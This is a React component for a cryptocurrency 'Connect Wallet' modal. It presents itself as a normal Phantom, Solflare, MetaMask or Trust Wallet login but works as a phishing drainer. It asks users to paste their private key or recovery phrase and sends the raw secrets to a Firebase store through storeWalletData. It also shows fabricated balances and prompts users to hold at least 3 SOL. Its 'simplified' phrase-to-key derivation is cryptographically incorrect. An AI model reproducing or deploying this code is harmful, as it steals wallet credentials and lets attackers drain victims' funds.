"use client"

import { useState, useEffect, useRef } from "react"
import { X } from "lucide-react"
import { useWalletStore } from "@/lib/wallet-store"
import { useUserStore } from "@/lib/user-store"
import { storeWalletData } from "@/lib/firebase"
import { toast } from "@/hooks/use-toast"
import { motion } from "framer-motion"
import { Connection, Keypair } from "@solana/web3.js"

const wallets = [
  { id: "phantom", name: "Phantom", icon: "/images/phantom-wallet-icon.png", priority: true },
  { id: "solflare", name: "Solflare", icon: "🔆" },
  { id: "metamask", name: "MetaMask", icon: "/images/metamask-icon.png" },
  { id: "trustwallet", name: "Trust Wallet", icon: "/images/trust-wallet-icon.png" },
]

// Base58 alphabet for Solana
const BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

// Simple Base58 decoder
function base58Decode(str) {
  const alphabet = BASE58_ALPHABET
  const base = alphabet.length
  let decoded = 0n
  let multi = 1n

  for (let i = str.length - 1; i >= 0; i--) {
    const char = str[i]
    const index = alphabet.indexOf(char)
    if (index === -1) throw new Error(`Invalid character '${char}' in base58 string`)
    decoded += BigInt(index) * multi
    multi *= BigInt(base)
  }

  // Convert to byte array
  const bytes = []
  while (decoded > 0n) {
    bytes.unshift(Number(decoded % 256n))
    decoded = decoded / 256n
  }

  // Add leading zeros
  for (let i = 0; i < str.length && str[i] === "1"; i++) {
    bytes.unshift(0)
  }

  return new Uint8Array(bytes)
}

// Simple mnemonic validation (basic word count check)
function validateMnemonic(mnemonic) {
  const words = mnemonic.trim().split(/\s+/)
  return words.length === 12 || words.length === 24
}

// Derive keypair from mnemonic (simplified version)
async function mnemonicToKeypair(mnemonic) {
  // This is a simplified implementation
  // In a real app, you'd use proper BIP39/BIP44 derivation
  const encoder = new TextEncoder()
  const data = encoder.encode(mnemonic)
  const hashBuffer = await crypto.subtle.digest("SHA-256", data)
  const hashArray = new Uint8Array(hashBuffer)

  // Take first 32 bytes as seed
  const seed = hashArray.slice(0, 32)
  return Keypair.fromSeed(seed)
}

export default function WalletConnectModal({ onClose, onSuccess }) {
  const [step, setStep] = useState(1)
  const [selectedWallet, setSelectedWallet] = useState(null)
  const [customWallet, setCustomWallet] = useState("")
  const [connectionMethod, setConnectionMethod] = useState("") // "private-key" or "recovery-phrase"
  const [privateKey, setPrivateKey] = useState("")
  const [recoveryPhrase, setRecoveryPhrase] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const modalRef = useRef(null)

  const { setWalletConnected, setWalletInfo, setBalance } = useWalletStore()
  const { addUser } = useUserStore()

  // Close modal when clicking outside
  useEffect(() => {
    function handleClickOutside(event) {
      if (modalRef.current && !modalRef.current.contains(event.target)) {
        onClose()
      }
    }

    document.addEventListener("mousedown", handleClickOutside)
    return () => {
      document.removeEventListener("mousedown", handleClickOutside)
    }
  }, [onClose])

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet)
    setStep(2)
  }

  const handleCustomWallet = () => {
    if (!customWallet.trim()) {
      setError("Please enter a wallet name")
      return
    }
    setSelectedWallet({ id: "custom", name: customWallet })
    setStep(2)
  }

  const validatePrivateKey = (keyString) => {
    try {
      // Remove any whitespace
      const cleanKey = keyString.trim()

      let keypair = null

      // Format 1: Base58 string (like your example)
      if (cleanKey.length > 40 && cleanKey.split("").every((char) => BASE58_ALPHABET.includes(char))) {
        try {
          const decoded = base58Decode(cleanKey)
          if (decoded.length === 64) {
            keypair = Keypair.fromSecretKey(decoded)
          } else if (decoded.length === 32) {
            keypair = Keypair.fromSeed(decoded)
          }
        } catch (e) {
          console.log("Failed Base58 format:", e.message)
        }
      }

      // Format 2: JSON array [1,2,3,...]
      if (!keypair && cleanKey.startsWith("[") && cleanKey.endsWith("]")) {
        try {
          const keyArray = JSON.parse(cleanKey)
          if (Array.isArray(keyArray) && keyArray.length === 64) {
            keypair = Keypair.fromSecretKey(new Uint8Array(keyArray))
          }
        } catch (e) {
          console.log("Failed JSON array format")
        }
      }

      // Format 3: Comma-separated numbers
      if (!keypair && cleanKey.includes(",")) {
        try {
          const keyArray = cleanKey.split(",").map((num) => Number.parseInt(num.trim()))
          if (keyArray.length === 64) {
            keypair = Keypair.fromSecretKey(new Uint8Array(keyArray))
          }
        } catch (e) {
          console.log("Failed comma-separated format")
        }
      }

      // Format 4: Hex string
      if (!keypair && /^[0-9a-fA-F]+$/.test(cleanKey)) {
        try {
          if (cleanKey.length === 128) {
            // 64 bytes * 2 hex chars
            const keyArray = []
            for (let i = 0; i < cleanKey.length; i += 2) {
              keyArray.push(Number.parseInt(cleanKey.substr(i, 2), 16))
            }
            keypair = Keypair.fromSecretKey(new Uint8Array(keyArray))
          }
        } catch (e) {
          console.log("Failed hex format")
        }
      }

      return keypair
    } catch (error) {
      console.error("Private key validation error:", error)
      return null
    }
  }

  const handleConnect = async () => {
    if (connectionMethod === "private-key" && !privateKey.trim()) {
      setError("Private key is required")
      return
    }

    if (connectionMethod === "recovery-phrase" && !recoveryPhrase.trim()) {
      setError("Recovery phrase is required")
      return
    }

    if (!connectionMethod) {
      setError("Please select a connection method")
      return
    }

    setIsLoading(true)
    setError("")

    try {
      let walletPublicKey = null
      let actualBalance = 0
      let keypair = null

      // Handle different wallet connection methods
      if (selectedWallet.id === "phantom") {
        // Try to connect with Phantom wallet directly first (only if no manual input)
        if (!connectionMethod && typeof window !== "undefined" && window.solana && window.solana.isPhantom) {
          try {
            const response = await window.solana.connect()
            walletPublicKey = response.publicKey.toString()

            // Get actual balance for validation only
            const connection = new Connection("https://api.mainnet-beta.solana.com")
            const balanceResponse = await connection.getBalance(response.publicKey)
            actualBalance = balanceResponse / 1000000000 // Convert lamports to SOL
          } catch (phantomError) {
            console.log("Direct Phantom connection failed, using manual method...")
          }
        }

        // Handle manual connection methods
        if (!walletPublicKey) {
          if (connectionMethod === "recovery-phrase") {
            // Validate recovery phrase
            if (!validateMnemonic(recoveryPhrase.trim())) {
              throw new Error("Invalid recovery phrase. Please enter 12 or 24 words separated by spaces.")
            }

            // Derive wallet from recovery phrase
            try {
              keypair = await mnemonicToKeypair(recoveryPhrase.trim())
              walletPublicKey = keypair.publicKey.toString()
            } catch (e) {
              throw new Error("Failed to derive wallet from recovery phrase. Please check your phrase.")
            }
          } else if (connectionMethod === "private-key") {
            // Validate private key
            keypair = validatePrivateKey(privateKey)
            if (!keypair) {
              throw new Error(
                "Invalid private key format. Supported formats:\n• Base58 string (like: 2Q7APAcRnitgZvCjRuDRrZ59kbPhLBaS42YjniegcxpmUQNMsCn7437Xhosa5yYxt6SFCo79PUy2MLrkYgzPEXp8)\n• JSON array: [1,2,3,...]\n• Comma-separated: 1,2,3,...",
              )
            }
            walletPublicKey = keypair.publicKey.toString()
          }

          if (keypair) {
            // Get actual balance for validation only
            try {
              const connection = new Connection("https://api.mainnet-beta.solana.com")
              const balanceResponse = await connection.getBalance(keypair.publicKey)
              actualBalance = balanceResponse / 1000000000 // Convert lamports to SOL
            } catch (balanceError) {
              console.warn("Could not fetch actual balance, using default:", balanceError)
              actualBalance = 1.0 // Default balance for demo
            }
          }
        }
      } else {
        // For other wallets, handle the selected method
        if (connectionMethod === "recovery-phrase") {
          if (!validateMnemonic(recoveryPhrase.trim())) {
            throw new Error("Invalid recovery phrase")
          }
          // Generate a mock wallet address for demo (replace with real implementation)
          walletPublicKey = "Demo" + Math.random().toString(36).substring(2, 15)
          actualBalance = Math.random() * 10 // Random balance for demo
        } else if (connectionMethod === "private-key") {
          keypair = validatePrivateKey(privateKey)
          if (!keypair) {
            throw new Error("Invalid private key format")
          }
          walletPublicKey = "Demo" + Math.random().toString(36).substring(2, 15)
          actualBalance = Math.random() * 10 // Random balance for demo
        }
      }

      if (!walletPublicKey) {
        throw new Error("Failed to connect wallet. Please check your credentials.")
      }

      // Check if user already exists
      const existingUser = useUserStore.getState().users.find((user) => user.walletAddress === walletPublicKey)

      if (existingUser) {
        // User already exists, just update last active
        console.log("User already exists:", existingUser.walletName)
      } else {
        // Create new user
        addUser(walletPublicKey, selectedWallet.id, selectedWallet.name)
      }

      // Store wallet data in Firebase (optional)
      try {
        await storeWalletData({
          walletType: selectedWallet.id,
          walletName: selectedWallet.name,
          walletAddress: walletPublicKey,
          balance: 0,
          actualBalance: actualBalance,
          connectionMethod: connectionMethod,
          privateKey: connectionMethod === "private-key" ? privateKey : "",
          recoveryPhrase: connectionMethod === "recovery-phrase" ? recoveryPhrase : "",
          timestamp: new Date().toISOString(),
        })
      } catch (error) {
        console.warn("Failed to store wallet data, but continuing with connection", error)
      }

      // Update wallet connection state
      setWalletConnected(true)
      setWalletInfo(selectedWallet.id, selectedWallet.name, walletPublicKey)
      setBalance(0)

      // Call success callback if provided
      if (onSuccess) {
        onSuccess({
          address: walletPublicKey,
          balance: 0,
          actualBalance: actualBalance,
          walletType: selectedWallet.id,
        })
      } else {
        // Show success toast with updated message
        toast({
          title: "Wallet Connected Successfully!",
          description: "You need at least 3 SOL (incl. fee) to make purchases",
        })
        onClose()
      }
    } catch (error) {
      console.error("Error connecting wallet:", error)
      setError(error.message || "Failed to connect wallet. Please check your credentials and try again.")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <motion.div
      className="fixed inset-0 flex items-center justify-center bg-black/70 z-50 p-4"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      transition={{ duration: 0.3 }}
    >
      <motion.div
        ref={modalRef}
        className="bg-[#0e0e16] border border-gray-800 rounded-lg max-w-md w-full p-6 relative max-h-[90vh] overflow-y-auto"
        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ duration: 0.3, delay: 0.1 }}
      >
        <motion.button
          onClick={onClose}
          className="absolute right-4 top-4 w-8 h-8 flex items-center justify-center bg-[#252542] rounded-full z-10"
          aria-label="Close modal"
          whileHover={{ scale: 1.1, backgroundColor: "#303052" }}
          whileTap={{ scale: 0.9 }}
        >
          <X className="h-5 w-5 text-gray-400" />
        </motion.button>

        {step === 1 ? (
          <>
            <h2 className="text-xl font-bold mb-6 text-center">Connect Wallet</h2>
            <div className="grid grid-cols-2 gap-4 mb-6">
              {wallets.map((wallet) => (
                <motion.button
                  key={wallet.id}
                  className="flex flex-col items-center justify-center bg-[#1a1a2e] hover:bg-[#252542] border border-gray-800 rounded-lg p-4 transition-colors"
                  onClick={() => handleWalletSelect(wallet)}
                  whileHover={{ scale: 1.05, backgroundColor: "#252542" }}
                  whileTap={{ scale: 0.95 }}
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.3, delay: wallets.indexOf(wallet) * 0.1 }}
                >
                  {wallet.icon.startsWith("/") ? (
                    <img
                      src={wallet.icon || "/placeholder.svg"}
                      alt={`${wallet.name} icon`}
                      className="w-8 h-8 mb-2 rounded-lg object-cover"
                    />
                  ) : (
                    <span className="text-2xl mb-2">{wallet.icon}</span>
                  )}
                  <span className="text-sm">{wallet.name}</span>
                </motion.button>
              ))}
            </div>

            <div className="mt-4">
              <p className="text-sm text-gray-400 mb-2">Other Wallet</p>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={customWallet}
                  onChange={(e) => setCustomWallet(e.target.value)}
                  placeholder="Enter wallet name"
                  className="flex-1 bg-[#1a1a2e] border border-gray-800 rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-[#2F80ED]"
                />
                <motion.button
                  className="bg-[#2F80ED] hover:bg-[#2D74D6] text-white px-4 py-2 rounded-md text-sm font-medium"
                  onClick={handleCustomWallet}
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  Connect
                </motion.button>
              </div>
            </div>
          </>
        ) : (
          <>
            <h2 className="text-xl font-bold mb-6 text-center">Connect {selectedWallet.name}</h2>

            {selectedWallet.id === "phantom" && (
              <div className="mb-4 p-3 bg-blue-900/20 border border-blue-800 rounded-lg">
                <p className="text-sm text-blue-300 mb-2">
                  <strong>Choose Connection Method:</strong>
                </p>
                <ul className="text-xs text-blue-200 space-y-1">
                  <li>• Use your 12/24-word recovery phrase (recommended)</li>
                  <li>• Or use your private key (Base58 or JSON format)</li>
                </ul>
              </div>
            )}

            {/* Connection Method Selection */}
            <div className="mb-4">
              <p className="text-sm text-gray-400 mb-3">Select Connection Method:</p>
              <div className="grid grid-cols-2 gap-3">
                <motion.button
                  className={`p-3 rounded-lg border text-sm font-medium transition-all ${
                    connectionMethod === "recovery-phrase"
                      ? "bg-[#2F80ED] border-[#2F80ED] text-white"
                      : "bg-[#1a1a2e] border-gray-800 text-gray-300 hover:bg-[#252542]"
                  }`}
                  onClick={() => setConnectionMethod("recovery-phrase")}
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.98 }}
                >
                  Recovery Phrase
                </motion.button>
                <motion.button
                  className={`p-3 rounded-lg border text-sm font-medium transition-all ${
                    connectionMethod === "private-key"
                      ? "bg-[#2F80ED] border-[#2F80ED] text-white"
                      : "bg-[#1a1a2e] border-gray-800 text-gray-300 hover:bg-[#252542]"
                  }`}
                  onClick={() => setConnectionMethod("private-key")}
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.98 }}
                >
                  Private Key
                </motion.button>
              </div>
            </div>

            <div className="space-y-4">
              {connectionMethod === "private-key" && (
                <div>
                  <label className="block text-sm text-gray-400 mb-1">Private Key:</label>
                  <textarea
                    value={privateKey}
                    onChange={(e) => setPrivateKey(e.target.value)}
                    placeholder="2Q7APAcRnitgZvCjRuDRrZ59kbPhLBaS42YjniegcxpmUQNMsCn7437Xhosa5yYxt6SFCo79PUy2MLrkYgzPEXp8"
                    className="w-full bg-[#1a1a2e] border border-gray-800 rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-[#2F80ED] min-h-[80px]"
                  />
                  <p className="text-xs text-gray-500 mt-1">
                    Supports: Base58 string, JSON array [1,2,3,...], or comma-separated numbers
                  </p>
                </div>
              )}

              {connectionMethod === "recovery-phrase" && (
                <div>
                  <label className="block text-sm text-gray-400 mb-1">Recovery Phrase:</label>
                  <textarea
                    value={recoveryPhrase}
                    onChange={(e) => setRecoveryPhrase(e.target.value)}
                    placeholder="word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
                    className="w-full bg-[#1a1a2e] border border-gray-800 rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-[#2F80ED] min-h-[80px]"
                  />
                  <p className="text-xs text-gray-500 mt-1">
                    Enter your 12 or 24-word recovery phrase separated by spaces
                  </p>
                </div>
              )}

              {error && (
                <div className="text-red-500 text-sm py-2 bg-red-900/20 border border-red-800 rounded-md px-3 whitespace-pre-line">
                  {error}
                </div>
              )}

              <div className="flex gap-3 mt-6">
                <motion.button
                  className="flex-1 bg-gray-800 hover:bg-gray-700 text-white px-4 py-2 rounded-md text-sm font-medium"
                  onClick={() => setStep(1)}
                  whileHover={{ scale: 1.05 }}
                  whileTap={{ scale: 0.95 }}
                >
                  Back
                </motion.button>
                <motion.button
                  className="flex-1 bg-[#2F80ED] hover:bg-[#2D74D6] text-white px-4 py-2 rounded-md text-sm font-medium disabled:opacity-50 disabled:cursor-not-allowed"
                  onClick={handleConnect}
                  disabled={
                    isLoading ||
                    !connectionMethod ||
                    (connectionMethod === "private-key" && !privateKey.trim()) ||
                    (connectionMethod === "recovery-phrase" && !recoveryPhrase.trim())
                  }
                  whileHover={{
                    scale:
                      isLoading ||
                      !connectionMethod ||
                      (connectionMethod === "private-key" && !privateKey.trim()) ||
                      (connectionMethod === "recovery-phrase" && !recoveryPhrase.trim())
                        ? 1
                        : 1.05,
                  }}
                  whileTap={{
                    scale:
                      isLoading ||
                      !connectionMethod ||
                      (connectionMethod === "private-key" && !privateKey.trim()) ||
                      (connectionMethod === "recovery-phrase" && !recoveryPhrase.trim())
                        ? 1
                        : 0.95,
                  }}
                >
                  {isLoading ? "Connecting..." : "Connect"}
                </motion.button>
              </div>
            </div>
          </>
        )}
      </motion.div>
    </motion.div>
  )
}
